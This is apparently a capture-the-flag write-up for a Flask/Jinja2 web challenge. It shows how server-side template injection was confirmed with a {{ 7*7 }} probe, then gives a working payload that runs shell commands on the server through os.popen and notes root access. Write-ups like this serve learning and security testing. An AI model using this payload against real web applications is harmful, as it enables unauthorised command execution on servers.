![image](https://user-images.githubusercontent.com/72671239/220068698-7877bbf4-a1b2-471e-b0cf-c490fbf25022.png)

once i noted that it uses Flask/jinja2 i thought of the SSTI, tested it and was confirmed
```bash
http://178.62.20.33:31990/{{ 7*7 }}
```
![image](https://user-images.githubusercontent.com/72671239/220067079-ec6adcc4-67d5-4a21-8dd4-f1c99108e9ec.png)

went through payload-all-things and got a payload that tests the os module to execute commands on the server
![image](https://user-images.githubusercontent.com/72671239/220065034-6b513ceb-a701-4b07-991a-cdf1766c439f.png)
![image](https://user-images.githubusercontent.com/72671239/220066582-9eda2518-1901-47fd-b42d-48f780210f83.png)
this indicates that we have root privligaes on the system, and also that the os module is enabled in this webapp, so in place of the 'id' command, we can execute any command

```bash
http://178.62.20.33:31990/{{ cycler.__init__.__globals__.os.popen('ls').read() }}
```
![image](https://user-images.githubusercontent.com/72671239/220067663-29f24b8a-d612-41ae-8e84-74205af1ef57.png)
![image](https://user-images.githubusercontent.com/72671239/220068034-9df97d4f-9167-4d7d-8e1a-de529e02abba.png)

you can understand the ins and outs of this payload using this file [SSTI payload](https://github.com/olaayman999/HTB/blob/main/web-chsllenges/Templated/SSTI.md)



